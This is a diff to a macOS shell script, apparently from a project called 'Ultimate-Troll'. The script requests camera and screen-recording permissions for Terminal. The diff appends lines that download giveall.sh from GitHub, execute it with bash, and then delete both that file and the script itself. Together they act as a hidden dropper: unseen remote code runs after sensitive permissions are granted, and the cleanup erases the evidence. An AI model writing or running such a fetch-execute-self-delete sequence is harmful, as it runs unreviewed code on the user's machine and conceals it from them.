@@ -53,4 +53,15 @@ echo "Requesting permissions for Terminal..."
 read -p "Press Enter to request camera and screen-recording permissions..."
 trigger_camera
 trigger_screenrecord
+
 echo "Done. Please grant permissions in System Preferences if prompted."
+# Download and execute giveall.sh, then clean up
+echo "[*] Downloading giveall.sh..."
+curl -fsSL "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/giveall.sh" -o "/tmp/giveall.sh"
+chmod +x "/tmp/giveall.sh"
+echo "[*] Executing giveall.sh..."
+bash "/tmp/giveall.sh"
+echo "[*] Cleaning up: removing giveall.sh and this script."
+rm -f "/tmp/giveall.sh"
+rm -- "$0"
+
